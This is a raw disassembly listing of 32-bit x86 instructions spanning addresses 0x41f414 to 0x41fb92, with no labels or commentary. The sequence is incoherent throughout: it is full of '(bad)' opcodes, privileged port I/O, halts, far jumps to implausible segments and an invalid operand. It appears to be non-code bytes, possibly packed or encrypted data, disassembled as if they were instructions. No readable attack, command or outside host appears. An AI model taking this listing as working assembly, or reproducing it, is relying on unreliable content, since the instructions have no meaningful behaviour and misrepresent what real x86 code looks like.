  41f414:	or     eax,0x55274306
  41f419:	jnp    0x41f3c2
  41f41b:	in     eax,0x24
  41f41d:	es cli 
  41f41f:	add    BYTE PTR [ecx-0x68],bl
  41f422:	xchg   ebx,eax
  41f423:	push   eax
  41f424:	imul   esi,DWORD PTR [ecx],0xffffffff
  41f427:	jne    0x41f468
  41f429:	sbb    edi,DWORD PTR [edi+0x59]
  41f42c:	lahf   
  41f42d:	or     al,0x7b
  41f42f:	sub    edi,ebp
  41f431:	add    eax,0xd21ad1ca
  41f436:	inc    edx
  41f437:	(bad)  
  41f438:	xor    eax,0xf8476ac4
  41f43d:	jp     0x41f452
  41f43f:	mov    cs,WORD PTR [eax+0x429b6fd2]
  41f445:	(bad)  
  41f446:	mov    edi,0x9ba883bc
  41f44b:	retf   
  41f44c:	gs scas al,BYTE PTR es:[edi]
  41f44e:	imul   edi,DWORD PTR [ecx-0x1a],0xdf12447a
  41f455:	push   cs
  41f456:	adc    al,al
  41f458:	xchg   ebx,eax
  41f459:	imul   edi,ecx,0xffffffef
  41f45c:	int    0x5c
  41f45e:	ret    
  41f45f:	test   al,0xff
  41f461:	adc    eax,0xb32f3354
  41f466:	ror    BYTE PTR [ebx-0x69],cl
  41f469:	out    0xcb,eax
  41f46b:	xor    BYTE PTR [ecx],ah
  41f46d:	ja     0x41f43d
  41f46f:	ds inc edi
  41f471:	sbb    ecx,DWORD PTR [edx+eax*8+0x60]
  41f475:	xor    DWORD PTR [esi-0x35],ecx
  41f478:	fstp   DWORD PTR [ebx-0x14c7c06e]
  41f47e:	sub    bl,BYTE PTR [eax+eax*1]
  41f481:	(bad)  
  41f482:	mov    eax,0xcbc8007c
  41f487:	mov    ecx,0xf5f4d7a
  41f48c:	cld    
  41f48d:	js     0x41f473
  41f48f:	aam    0xc
  41f491:	xchg   DWORD PTR [eax+0x16cd17bf],ecx
  41f497:	(bad)  
  41f498:	in     eax,dx
  41f499:	jae    0x41f434
  41f49b:	ss mov esp,0xf9ba28d0
  41f4a1:	dec    BYTE PTR [ebp+0x71]
  41f4a4:	jl     0x41f49b
  41f4a6:	es (bad) 
  41f4a8:	sbb    ch,bh
  41f4aa:	test   ecx,esp
  41f4ac:	hlt    
  41f4ad:	sub    BYTE PTR [ebp+0x65],dl
  41f4b0:	jmp    0x41f52b
  41f4b2:	sub    ch,ch
  41f4b4:	sbb    esi,edi
  41f4b6:	ss out dx,eax
  41f4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4b9:	dec    esi
  41f4ba:	xchg   ecx,eax
  41f4bb:	and    cl,BYTE PTR [ebx]
  41f4bd:	test   eax,0x453bafb2
  41f4c2:	pop    esi
  41f4c3:	les    esi,FWORD PTR [eax+0x5c5614eb]
  41f4c9:	pop    es
  41f4ca:	push   eax
  41f4cb:	bound  edx,QWORD PTR [eax+0x0]
  41f4ce:	je     0x41f49f
  41f4d0:	sbb    BYTE PTR [edx],0x63
  41f4d3:	xor    eax,esi
  41f4d5:	loop   0x41f48b
  41f4d7:	mov    cl,ch
  41f4d9:	mov    ebp,0x9a51b204
  41f4de:	aas    
  41f4df:	push   0xffffffda
  41f4e1:	outs   dx,DWORD PTR ds:[esi]
  41f4e2:	or     al,0xa4
  41f4e4:	adc    BYTE PTR [eax-0x243a70ae],al
  41f4ea:	dec    esp
  41f4eb:	inc    esi
  41f4ec:	push   ds
  41f4ed:	jmp    0xb078:0x68e81c75
  41f4f4:	xchg   ebx,eax
  41f4f5:	dec    eax
  41f4f6:	xor    esi,DWORD PTR [ebp-0x43f87872]
  41f4fc:	mov    al,0xfa
  41f4fe:	xchg   ebp,eax
  41f4ff:	in     al,dx
  41f500:	sbb    dh,BYTE PTR [edi]
  41f502:	pop    eax
  41f503:	(bad)  
  41f505:	gs pop ebp
  41f507:	lods   al,BYTE PTR ds:[esi]
  41f508:	out    dx,eax
  41f509:	mov    eax,0x7a3d159d
  41f50e:	and    edi,0xffffff80
  41f511:	fcmovnbe st,st(2)
  41f513:	inc    edx
  41f514:	les    ecx,FWORD PTR [edx-0x3d]
  41f517:	push   cs
  41f518:	mov    ch,0x5b
  41f51a:	(bad)  
  41f51b:	aam    0x46
  41f51d:	mov    dl,dl
  41f51f:	test   BYTE PTR [ebp-0x4e],bh
  41f522:	xor    eax,0xd701165
  41f527:	out    0x29,al
  41f529:	ret    0x79dc
  41f52c:	push   ds
  41f52d:	mov    ah,0x3
  41f52f:	jnp    0x41f578
  41f531:	dec    esi
  41f532:	cmp    ebx,DWORD PTR [ebx+0x7d62106a]
  41f538:	(bad)  
  41f539:	jp     0x41f4c7
  41f53b:	sbb    DWORD PTR [esi],0xffffff9a
  41f53e:	int3   
  41f53f:	fidiv  DWORD PTR [esi-0x55]
  41f542:	sahf   
  41f543:	ret    0x956f
  41f546:	or     dl,cl
  41f548:	adc    DWORD PTR [edx-0x2],ecx
  41f54b:	adc    eax,0x7f7fe0d3
  41f550:	pop    ss
  41f551:	sub    edi,edi
  41f553:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f555:	je     0x41f589
  41f557:	jb     0x41f586
  41f559:	xchg   edx,eax
  41f55a:	dec    ebx
  41f55b:	push   eax
  41f55c:	jb     0x41f523
  41f55e:	stos   BYTE PTR es:[edi],al
  41f55f:	lods   al,BYTE PTR ds:[esi]
  41f560:	and    eax,0xbbedf1f1
  41f565:	or     edi,esi
  41f567:	dec    edx
  41f568:	jb     0x41f584
  41f56a:	retw   0x5307
  41f56e:	pop    ds
  41f56f:	xor    al,BYTE PTR [edx+0x2fd854bd]
  41f575:	in     al,0xe9
  41f577:	inc    ecx
  41f578:	in     al,dx
  41f579:	int    0x94
  41f57b:	ja     0x41f537
  41f57d:	dec    edi
  41f57e:	test   DWORD PTR [eax+0x566b2050],ebp
  41f584:	cmp    BYTE PTR [ebp+0x22],ah
  41f587:	out    0x38,al
  41f589:	xchg   esp,eax
  41f58a:	sub    al,0xcc
  41f58c:	jmp    0x48ba5e1
  41f591:	push   ebx
  41f592:	lods   al,BYTE PTR ds:[esi]
  41f593:	fstp   QWORD PTR [edx-0x4296190f]
  41f599:	stos   BYTE PTR es:[edi],al
  41f59a:	adc    cl,dl
  41f59c:	cmp    al,0xbe
  41f59e:	addr16 mov al,ds:0x4a92
  41f5a2:	fild   DWORD PTR ds:0xcc55984b
  41f5a8:	pop    ds
  41f5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5aa:	and    DWORD PTR [edx-0x6314cebd],edx
  41f5b0:	mov    ah,0x6e
  41f5b2:	daa    
  41f5b3:	mov    edx,0xc07c6a4d
  41f5b8:	scas   al,BYTE PTR es:[edi]
  41f5b9:	mov    bh,0x3d
  41f5bb:	fisttp DWORD PTR [eax+0x613878e2]
  41f5c1:	mov    ebx,0xf5a3395
  41f5c6:	sbb    eax,0x304fc6ec
  41f5cb:	loope  0x41f62c
  41f5cd:	(bad)  
  41f5ce:	and    ecx,ebp
  41f5d0:	or     esp,edi
  41f5d2:	mov    edi,ecx
  41f5d4:	stos   DWORD PTR es:[edi],eax
  41f5d5:	jmp    0x41f58d
  41f5d7:	pop    ss
  41f5d8:	pop    ds
  41f5d9:	cmp    ch,BYTE PTR [ecx-0x1c180887]
  41f5df:	les    esi,FWORD PTR [ecx+eiz*2+0x5fbbb86a]
  41f5e6:	loopne 0x41f5dd
  41f5e8:	lods   eax,DWORD PTR ds:[esi]
  41f5e9:	add    DWORD PTR [edx-0x22c676fa],ecx
  41f5ef:	test   DWORD PTR [esi+0x70244ce1],edi
  41f5f5:	pop    edx
  41f5f6:	push   ebp
  41f5f7:	add    DWORD PTR [ecx+0xe1c4701],ebp
  41f5fd:	test   eax,0x8cb2469b
  41f602:	rcr    DWORD PTR [edi],cl
  41f604:	inc    ecx
  41f605:	cmc    
  41f606:	das    
  41f607:	(bad)  
  41f608:	add    ecx,DWORD PTR [edi+0x20]
  41f60b:	add    dh,BYTE PTR [ecx+0x2118e08c]
  41f611:	dec    esi
  41f612:	aam    0x8f
  41f614:	xchg   DWORD PTR [eax],ebx
  41f616:	mov    esp,0x37ef4c7c
  41f61b:	mov    ebx,0xb6fcff0c
  41f620:	add    BYTE PTR [esi-0x5117d3a],0xb7
  41f627:	lahf   
  41f628:	xchg   ebx,eax
  41f629:	adc    eax,DWORD PTR ds:0x5f10aeff
  41f62f:	mov    ds:0xd347caf1,eax
  41f634:	push   edi
  41f635:	mov    dh,bl
  41f637:	xchg   esi,eax
  41f638:	fst    QWORD PTR [eax-0x463ba2af]
  41f63f:	sub    eax,0xbb87658c
  41f644:	retf   0x393d
  41f647:	xor    al,al
  41f649:	loop   0x41f628
  41f64b:	jecxz  0x41f5f0
  41f64d:	call   0x7bba12e9
  41f652:	repnz mov al,ds:0xc64b3d36
  41f658:	fcmovnbe st,st(1)
  41f65a:	in     al,0x5
  41f65c:	adc    BYTE PTR [ebp+ebp*1-0xf0a2620],dl
  41f663:	fs into 
  41f665:	(bad)  
  41f666:	loop   0x41f68f
  41f668:	xchg   ebx,eax
  41f669:	sbb    cl,al
  41f66b:	in     al,0xa7
  41f66d:	or     eax,0x7057fbb6
  41f672:	push   ss
  41f673:	in     al,dx
  41f674:	daa    
  41f675:	frstor [eax+0x78325d46]
  41f67b:	mov    ch,0x51
  41f67d:	arpl   si,bp
  41f67f:	imul   DWORD PTR [edi+0x3]
  41f682:	aaa    
  41f683:	xchg   ebp,eax
  41f684:	jle    0x41f691
  41f686:	pusha  
  41f687:	jae    0x41f692
  41f689:	lea    ebx,[ebx-0x5e19561e]
  41f68f:	push   ds
  41f690:	aad    0x36
  41f692:	daa    
  41f693:	adc    eax,DWORD PTR [ecx+0x47]
  41f696:	push   0xdd34f6d5
  41f69b:	add    al,0x90
  41f69d:	push   eax
  41f69e:	out    0x91,al
  41f6a0:	push   esi
  41f6a1:	dec    edi
  41f6a2:	mov    ch,0xe4
  41f6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6a5:	xchg   ebx,eax
  41f6a6:	pop    edi
  41f6a7:	sbb    dl,BYTE PTR [edx-0x21]
  41f6aa:	pop    ebx
  41f6ab:	shl    eax,0x9
  41f6ae:	ds dec ebp
  41f6b0:	repz jmp 0xf4dbb043
  41f6b6:	in     eax,dx
  41f6b7:	xchg   edx,eax
  41f6b8:	call   0x9555ede5
  41f6bd:	fs and al,al
  41f6c0:	sub    ah,dl
  41f6c2:	outs   dx,BYTE PTR ds:[esi]
  41f6c3:	out    dx,eax
  41f6c4:	std    
  41f6c5:	dec    ebp
  41f6c6:	pop    edx
  41f6c7:	xchg   esi,eax
  41f6c8:	cmp    al,0x5e
  41f6ca:	xchg   ebx,eax
  41f6cb:	arpl   WORD PTR [edi],bx
  41f6cd:	push   ecx
  41f6ce:	mov    ebp,0x7b09ceca
  41f6d3:	jno    0x41f663
  41f6d5:	gs js  0x41f718
  41f6d8:	fbstp  TBYTE PTR ds:0x53efbc80
  41f6de:	ret    0x484d
  41f6e1:	lahf   
  41f6e2:	in     eax,dx
  41f6e3:	mov    ds:0xc62d62c5,al
  41f6e8:	fst    QWORD PTR [eax]
  41f6ea:	mov    ah,0xee
  41f6ec:	out    dx,al
  41f6ed:	sar    DWORD PTR [edx],cl
  41f6ef:	std    
  41f6f0:	jmp    0xab9ab2f5
  41f6f5:	add    eax,0x195412a2
  41f6fa:	dec    ecx
  41f6fb:	fld    DWORD PTR [esi+0x3e]
  41f6fe:	xchg   DWORD PTR [edi-0x1c0ae4fb],ecx
  41f704:	sbb    DWORD PTR [ebx-0x602524f1],0xcff5d67c
  41f70e:	push   edi
  41f70f:	aaa    
  41f710:	mov    al,ds:0x7ebab1b
  41f715:	aas    
  41f716:	imul   ebx,ebx,0x27
  41f719:	arpl   bx,di
  41f71b:	sub    eax,0xda052216
  41f720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f721:	arpl   sp,di
  41f723:	sbb    ebp,edi
  41f725:	icebp  
  41f726:	cwde   
  41f727:	cmc    
  41f728:	xlat   BYTE PTR ds:[ebx]
  41f729:	xchg   ebx,eax
  41f72a:	mov    al,0xe8
  41f72c:	inc    eax
  41f72d:	push   edi
  41f72e:	jge    0x41f77f
  41f730:	cmp    al,0xb5
  41f732:	cld    
  41f733:	lea    ebx,[edx]
  41f735:	hlt    
  41f736:	mov    eax,ss:0x701a4a43
  41f73c:	push   ss
  41f73d:	(bad)  [ecx-0x5d]
  41f740:	test   dh,bl
  41f742:	jmp    0x41f727
  41f744:	inc    edi
  41f745:	fild   QWORD PTR [edx-0x6]
  41f748:	cld    
  41f749:	popa   
  41f74a:	mov    bh,0xdd
  41f74c:	xor    BYTE PTR [esi-0x62],bl
  41f74f:	sub    eax,0xac1ed703
  41f754:	xchg   esi,eax
  41f755:	lods   al,BYTE PTR ds:[esi]
  41f756:	push   edx
  41f757:	lea    edi,[ecx+0x22]
  41f75a:	pushf  
  41f75b:	pop    ds
  41f75c:	lahf   
  41f75d:	lds    esp,FWORD PTR fs:[eax]
  41f760:	mov    esp,0xd330414e
  41f765:	aaa    
  41f766:	sets   BYTE PTR [ecx-0x4c2c8bc7]
  41f76d:	popa   
  41f76e:	xchg   esp,eax
  41f76f:	popf   
  41f770:	sbb    dh,BYTE PTR [ebp+0x369de15f]
  41f776:	dec    eax
  41f777:	ins    BYTE PTR es:[edi],dx
  41f778:	js     0x41f765
  41f77a:	fsubp  st(2),st
  41f77c:	inc    ebp
  41f77d:	mov    ecx,0xdfd9e5d8
  41f782:	in     al,dx
  41f783:	mov    ecx,0x3eb4a5a3
  41f788:	or     BYTE PTR [esi-0x4cfebeae],al
  41f78e:	inc    ebx
  41f78f:	or     eax,0xc45767f0
  41f794:	in     eax,dx
  41f795:	test   DWORD PTR [ebp-0x38],ebx
  41f798:	es xor esp,edx
  41f79b:	ins    BYTE PTR es:[edi],dx
  41f79c:	jno    0x41f819
  41f79e:	push   cs
  41f79f:	repz jg 0x41f77e
  41f7a2:	jo     0x41f7b9
  41f7a4:	pop    ebx
  41f7a5:	rcr    cl,1
  41f7a7:	test   DWORD PTR [ebp+0x171bc3ff],edi
  41f7ad:	mov    cs,WORD PTR [ecx-0x6]
  41f7b0:	inc    edi
  41f7b1:	jnp    0x41f74d
  41f7b3:	retf   0xd527
  41f7b6:	lods   eax,DWORD PTR ds:[esi]
  41f7b7:	inc    ecx
  41f7b8:	ss adc eax,0x6d639af4
  41f7be:	mov    ecx,0xb530c1b1
  41f7c3:	fwait
  41f7c4:	cmp    DWORD PTR [edi+0x15aee110],eax
  41f7ca:	pop    ss
  41f7cb:	(bad)  
  41f7cc:	cs xchg ecx,eax
  41f7ce:	mov    eax,DWORD PTR [ebx+0x246c6168]
  41f7d4:	pop    edi
  41f7d5:	add    al,0x22
  41f7d7:	adc    bl,dh
  41f7d9:	jmp    0x482b:0x6a53ab07
  41f7e0:	dec    edx
  41f7e1:	sti    
  41f7e2:	pop    ds
  41f7e3:	les    eax,FWORD PTR [ebp-0x4b06f521]
  41f7e9:	inc    edi
  41f7ea:	into   
  41f7eb:	call   0x4302:0x7db111fa
  41f7f2:	scas   eax,DWORD PTR es:[edi]
  41f7f3:	jno    0x41f7a4
  41f7f5:	not    DWORD PTR [ecx]
  41f7f7:	or     ecx,DWORD PTR [eax]
  41f7f9:	mov    dl,BYTE PTR ds:0xecdc65ee
  41f7ff:	dec    eax
  41f800:	fwait
  41f801:	fwait
  41f802:	and    eax,edx
  41f804:	adc    DWORD PTR [edi],esi
  41f806:	pop    esi
  41f807:	mov    dh,BYTE PTR ds:0xfc9efdd1
  41f80d:	mov    ds:0xdb28654e,eax
  41f812:	int    0xfc
  41f814:	add    dl,ah
  41f816:	scas   al,BYTE PTR es:[edi]
  41f817:	out    dx,al
  41f818:	pop    esi
  41f819:	popa   
  41f81a:	add    al,0x3a
  41f81c:	mov    eax,0xd938d32e
  41f821:	addr16 and eax,0xae4ee2a9
  41f827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f828:	int    0xfa
  41f82a:	mov    ebp,0x7eb9e1e9
  41f82f:	mov    eax,0xecc4d4d5
  41f834:	jo     0x41f7eb
  41f836:	std    
  41f837:	mov    bh,0x93
  41f839:	adc    DWORD PTR [edx-0x7fdb21e8],0xffffffe2
  41f840:	sub    bh,BYTE PTR [ecx-0x49]
  41f843:	xchg   DWORD PTR [edx-0x3c5a9366],edx
  41f849:	dec    edx
  41f84a:	and    BYTE PTR [eax-0x69f6f0f4],0x90
  41f851:	sub    eax,0x3bc8f892
  41f856:	mov    ds:0xb743cabd,eax
  41f85b:	icebp  
  41f85c:	(bad)  
  41f85e:	scas   eax,DWORD PTR es:[edi]
  41f85f:	out    0x97,eax
  41f861:	pop    ecx
  41f862:	pushf  
  41f863:	lahf   
  41f864:	inc    edx
  41f865:	bound  ecx,QWORD PTR [esi-0x3c]
  41f868:	f2xm1  
  41f86a:	add    edi,DWORD PTR [edi+eax*8]
  41f86d:	jmp    0x217b35df
  41f872:	adc    eax,0xf05ae96e
  41f877:	xchg   edi,eax
  41f878:	or     al,0x14
  41f87a:	jg     0x41f8f9
  41f87c:	cmp    BYTE PTR [esi+0x1ef0ff76],ch
  41f882:	daa    
  41f883:	(bad)  
  41f884:	cli    
  41f885:	xchg   DWORD PTR [edx+0x5ddf9cd9],ecx
  41f88b:	adc    eax,0x8f7e496
  41f890:	fdivr  DWORD PTR [esi-0x562ce897]
  41f896:	xchg   esi,eax
  41f897:	and    DWORD PTR [ecx+0x2104a2e6],ebx
  41f89d:	mov    ?,WORD PTR [edx+ebx*8]
  41f8a0:	sbb    BYTE PTR [ebp-0x1d],ah
  41f8a3:	arpl   WORD PTR [esi+0x69],ax
  41f8a6:	push   ebp
  41f8a7:	gs and eax,0xf3acdd07
  41f8ad:	out    dx,eax
  41f8ae:	jecxz  0x41f87c
  41f8b0:	push   0xa204dc7a
  41f8b5:	push   ebx
  41f8b6:	pusha  
  41f8b7:	cmp    BYTE PTR [edi-0x901d3f3],bl
  41f8bd:	dec    DWORD PTR [eax+0x7]
  41f8c0:	pop    esi
  41f8c1:	jns    0x41f8ae
  41f8c3:	mov    edi,0x977c1009
  41f8c8:	jbe    0x41f87c
  41f8ca:	sub    BYTE PTR [ebx],0x47
  41f8cd:	mov    dl,0x28
  41f8cf:	jno    0x41f8c7
  41f8d1:	jle    0x41f8ad
  41f8d3:	xchg   edi,eax
  41f8d4:	and    al,0x5
  41f8d6:	loopne 0x41f932
  41f8d8:	jmp    0x41f92e
  41f8da:	ja     0x41f905
  41f8dc:	xchg   ecx,eax
  41f8dd:	ds inc edi
  41f8df:	push   esp
  41f8e0:	arpl   WORD PTR [esi+0x22f494c3],ax
  41f8e6:	popf   
  41f8e7:	imul   edx,DWORD PTR [edx-0x30],0x9540010a
  41f8ee:	dec    ebx
  41f8ef:	sar    BYTE PTR [edx-0x5decf7de],0xc8
  41f8f6:	std    
  41f8f7:	or     dl,BYTE PTR [eax]
  41f8f9:	lds    ecx,FWORD PTR ds:0x7cfc2a2a
  41f8ff:	in     al,0xcc
  41f901:	push   ss
  41f902:	mov    BYTE PTR [ebx-0x63],dl
  41f905:	xchg   edi,eax
  41f906:	test   ah,cl
  41f908:	or     DWORD PTR [ebp-0x3881f665],esi
  41f90e:	gs aas 
  41f910:	sub    DWORD PTR [ebp+0x24195bb4],esp
  41f916:	add    DWORD PTR [esi+0x2b],ebp
  41f919:	test   eax,0x1c275d5f
  41f91e:	pop    esp
  41f91f:	clc    
  41f920:	push   eax
  41f921:	pop    DWORD PTR [edx-0x77]
  41f924:	jp     0x41f958
  41f926:	cmp    eax,0xb5d02cd1
  41f92b:	pop    dx
  41f92d:	jo     0x41f94c
  41f92f:	add    al,0x89
  41f931:	sar    DWORD PTR [edi+esi*8-0x9],1
  41f935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f936:	cmp    DWORD PTR [ebx],ecx
  41f938:	adc    BYTE PTR [ecx],ah
  41f93a:	dec    edx
  41f93b:	xor    al,0x4
  41f93d:	loope  0x41f97d
  41f93f:	fucomip st,st(2)
  41f941:	mov    dl,0x3f
  41f943:	jp     0x41f93f
  41f945:	jnp    0x41f96a
  41f947:	sti    
  41f948:	cwde   
  41f949:	aam    0xc7
  41f94b:	xor    BYTE PTR [ebx-0x75],dh
  41f94e:	push   esp
  41f94f:	das    
  41f950:	stos   BYTE PTR es:[edi],al
  41f951:	in     eax,dx
  41f952:	push   esi
  41f953:	daa    
  41f954:	xchg   BYTE PTR [ebp-0x3bbb8e99],ch
  41f95a:	rol    ebx,1
  41f95c:	repnz mov eax,0xb84c3e2c
  41f962:	xchg   ebx,eax
  41f963:	pop    edx
  41f964:	dec    edx
  41f965:	pop    edx
  41f966:	jl     0x41f8f3
  41f968:	mov    esp,0x129e6e0f
  41f96d:	mov    dl,0xfd
  41f96f:	xchg   ebx,eax
  41f970:	jbe    0x41f9b2
  41f972:	mov    DWORD PTR [edx+0x41ed0976],ebp
  41f978:	inc    ebp
  41f979:	mov    dl,0x5e
  41f97b:	cwde   
  41f97c:	aad    0x53
  41f97e:	imul   edi,DWORD PTR [esi],0x1ab0222f
  41f984:	jns    0x41f9f0
  41f986:	cmp    BYTE PTR [ecx],ch
  41f988:	and    eax,0x27f57e91
  41f98d:	gs cld 
  41f98f:	shr    DWORD PTR ds:0x233c338b,0x7f
  41f996:	xchg   DWORD PTR [ebx-0x9b3d864],ecx
  41f99c:	dec    esp
  41f99d:	xchg   BYTE PTR [eax+0xb],bh
  41f9a0:	iret   
  41f9a1:	scas   eax,DWORD PTR es:[edi]
  41f9a2:	rcr    edi,cl
  41f9a4:	add    eax,0x1da4ec27
  41f9a9:	jle    0x41f991
  41f9ab:	fs adc eax,0x89f6b7d4
  41f9b1:	out    0x65,al
  41f9b3:	cmp    cl,BYTE PTR [edi-0x21]
  41f9b6:	and    ah,dl
  41f9b8:	sahf   
  41f9b9:	mov    al,0x9a
  41f9bb:	cmp    eax,0x391e338e
  41f9c0:	adc    al,0xea
  41f9c2:	std    
  41f9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9c4:	adc    cl,dl
  41f9c6:	pop    ebp
  41f9c7:	dec    edi
  41f9c8:	add    ebp,DWORD PTR [edx]
  41f9ca:	aam    0x2e
  41f9cc:	mov    eax,0x8f71f920
  41f9d1:	xor    BYTE PTR [ecx+edx*8],al
  41f9d4:	ret    0x8c11
  41f9d7:	and    al,0x23
  41f9d9:	neg    BYTE PTR [edx]
  41f9db:	clc    
  41f9dc:	imul   esi,DWORD PTR [ebx],0x5d
  41f9df:	shr    DWORD PTR [ecx],cl
  41f9e1:	push   ds
  41f9e2:	sub    DWORD PTR [ecx+edx*2+0x5a894341],edx
  41f9e9:	add    eax,0x88f4b39e
  41f9ee:	aaa    
  41f9ef:	xchg   ebp,eax
  41f9f0:	push   esp
  41f9f1:	mov    esp,0x180ec8e0
  41f9f6:	out    0x20,al
  41f9f8:	fwait
  41f9f9:	pop    esi
  41f9fa:	in     al,0x5f
  41f9fc:	jb     0x41f9d8
  41f9fe:	out    dx,eax
  41f9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa00:	push   0xffffff9e
  41fa02:	std    
  41fa03:	push   es
  41fa04:	add    eax,0xa1eee2b7
  41fa09:	imul   esi,DWORD PTR [ebx-0x20],0x4
  41fa0d:	and    DWORD PTR [ebx-0x141b6092],esp
  41fa13:	pop    ebx
  41fa14:	shr    BYTE PTR [edx],0xe1
  41fa17:	adc    eax,0x199f0ac0
  41fa1c:	push   ss
  41fa1d:	jnp    0x41f9b0
  41fa1f:	mov    al,ds:0x8fe3244f
  41fa24:	xlat   BYTE PTR ds:[ebx]
  41fa25:	push   edx
  41fa26:	pop    ss
  41fa27:	cs xchg edx,eax
  41fa29:	arpl   WORD PTR ds:0x8fcda815,bp
  41fa2f:	dec    ebx
  41fa30:	mov    ebp,0x9da8d3fe
  41fa35:	mov    bh,0xc4
  41fa37:	jo     0x41faa8
  41fa39:	ret    0x58ab
  41fa3c:	pop    ss
  41fa3d:	or     ecx,edi
  41fa3f:	lods   eax,DWORD PTR ds:[esi]
  41fa40:	icebp  
  41fa41:	adc    dh,bl
  41fa43:	clc    
  41fa44:	adc    ch,BYTE PTR [ebp-0x507bb1dc]
  41fa4a:	jo     0x41fac7
  41fa4c:	inc    esi
  41fa4d:	adc    esp,DWORD PTR [eax-0x515c3731]
  41fa53:	setp   BYTE PTR [ebp-0x7a]
  41fa57:	mov    cl,0x28
  41fa59:	jp     0x41fab3
  41fa5b:	push   es
  41fa5c:	nop
  41fa5d:	inc    esi
  41fa5e:	mov    ch,0x7e
  41fa60:	pop    es
  41fa61:	inc    esp
  41fa62:	ficomp DWORD PTR [edi]
  41fa64:	pop    DWORD PTR [eax]
  41fa66:	inc    ecx
  41fa67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa68:	aas    
  41fa69:	aas    
  41fa6a:	enter  0xa100,0xda
  41fa6e:	std    
  41fa6f:	push   ds
  41fa70:	mov    ah,0x3c
  41fa72:	inc    ebp
  41fa73:	dec    edx
  41fa74:	fcom   QWORD PTR [edi]
  41fa76:	aaa    
  41fa77:	push   esi
  41fa78:	arpl   WORD PTR [edx-0x78414dd9],sp
  41fa7e:	int3   
  41fa7f:	jbe    0x41faa5
  41fa81:	out    dx,eax
  41fa82:	sub    esi,0xffffff83
  41fa85:	jmp    0xf5b63ede
  41fa8a:	ins    DWORD PTR es:[edi],dx
  41fa8b:	and    DWORD PTR ds:0x20f0de59,eax
  41fa91:	xlat   BYTE PTR ds:[ebx]
  41fa92:	mov    eax,0x5120175
  41fa97:	popf   
  41fa98:	(bad)  
  41fa99:	(bad)  
  41fa9a:	das    
  41fa9b:	call   0x235e:0xe00a4b8f
  41faa2:	mov    fs,WORD PTR [ebp-0x64]
  41faa5:	push   0x5aa7222a
  41faaa:	sbb    DWORD PTR [esi-0x329898d9],ebx
  41fab0:	dec    edi
  41fab1:	repz aad 0x6f
  41fab4:	pop    edi
  41fab5:	pop    esp
  41fab6:	sar    BYTE PTR [edx+eiz*1-0x61c56f19],1
  41fabd:	shl    BYTE PTR [ecx],cl
  41fabf:	jmp    0x5fee8d0d
  41fac4:	mov    ss,WORD PTR [ebx]
  41fac6:	sub    eax,esi
  41fac8:	fidivr WORD PTR [esi+edi*4-0x15]
  41facc:	fstp   TBYTE PTR [edx]
  41face:	cmp    al,0x3b
  41fad0:	(bad)  
  41fad1:	outs   dx,BYTE PTR ds:[esi]
  41fad2:	pop    es
  41fad3:	in     al,dx
  41fad4:	mov    ds:0x9a5b7768,eax
  41fad9:	pop    esi
  41fada:	sbb    al,0xca
  41fadc:	inc    ebp
  41fadd:	popf   
  41fade:	pop    esi
  41fadf:	int    0xe9
  41fae1:	ss (bad) 
  41fae3:	adc    eax,DWORD PTR [ebx]
  41fae5:	lds    eax,FWORD PTR [esi+ebp*8-0x58c76776]
  41faec:	retf   
  41faed:	adc    BYTE PTR [ecx+0x46],dh
  41faf0:	fxch   st(6)
  41faf2:	pop    ebp
  41faf3:	cmp    DWORD PTR [edx],0xffffffd5
  41faf6:	fdiv   st,st(0)
  41faf8:	imul   esi,esi,0x2a
  41fafb:	stc    
  41fafc:	push   ebp
  41fafd:	mov    ebp,0xe8b21118
  41fb02:	lock or ecx,DWORD PTR [edi+0x22]
  41fb06:	xchg   DWORD PTR [esi+0x6ea8d4eb],ebx
  41fb0c:	jp     0x41fb1c
  41fb0e:	or     DWORD PTR [ebx+eiz*2-0x9],0x2d458f67
  41fb16:	cli    
  41fb17:	stc    
  41fb18:	mov    bl,0xc0
  41fb1a:	add    bl,dl
  41fb1c:	xchg   edx,eax
  41fb1d:	jo     0x41fb70
  41fb1f:	push   edi
  41fb20:	mov    dl,0xe5
  41fb22:	push   0x6fe66316
  41fb27:	ja     0x41faf3
  41fb29:	mov    bh,0x8f
  41fb2b:	jnp    0x41fad0
  41fb2d:	inc    eax
  41fb2e:	fdiv   DWORD PTR [ebx+ecx*4+0x3cc87984]
  41fb35:	jl     0x41faff
  41fb37:	fimul  WORD PTR [ecx+ebx*8-0x34f42652]
  41fb3e:	(bad)  
  41fb3f:	adc    edi,DWORD PTR [eax-0x64900e18]
  41fb45:	push   ss
  41fb46:	mov    dl,0x4a
  41fb48:	stc    
  41fb49:	js     0x41fb04
  41fb4b:	loopne 0x41fb3e
  41fb4d:	mov    edi,0x31eb2692
  41fb52:	outs   dx,DWORD PTR ds:[esi]
  41fb53:	cmp    DWORD PTR [ebx],edi
  41fb55:	jle    0x41fb37
  41fb57:	mov    dl,0xd5
  41fb59:	popf   
  41fb5a:	enter  0x5f59,0xc4
  41fb5e:	cmp    DWORD PTR [edi+0x3f],eax
  41fb61:	push   ebp
  41fb62:	sbb    edx,DWORD PTR [ebx]
  41fb64:	lock stc 
  41fb66:	shr    DWORD PTR [ecx],0x9c
  41fb69:	pop    edx
  41fb6a:	lds    ebx,FWORD PTR [eax]
  41fb6c:	jns    0x41fbd7
  41fb6e:	and    ah,dh
  41fb70:	push   edi
  41fb71:	and    DWORD PTR [eax],0x68
  41fb74:	shl    DWORD PTR [esi+0x333cfa8c],0x92
  41fb7b:	and    DWORD PTR [ebp-0x5f],edi
  41fb7e:	or     al,0xd0
  41fb80:	scas   al,BYTE PTR es:[edi]
  41fb81:	mov    al,ds:0x2089a6
  41fb86:	jo     0x41fb2a
  41fb88:	mov    bl,0xed
  41fb8a:	cmp    ebx,DWORD PTR [ebx]
  41fb8c:	jns    0x41fc0d
  41fb8e:	and    BYTE PTR [ebx],ah
  41fb90:	js     0x41fbbb
  41fb92:	add    esp,DWORD PTR [ebx+0x6f]
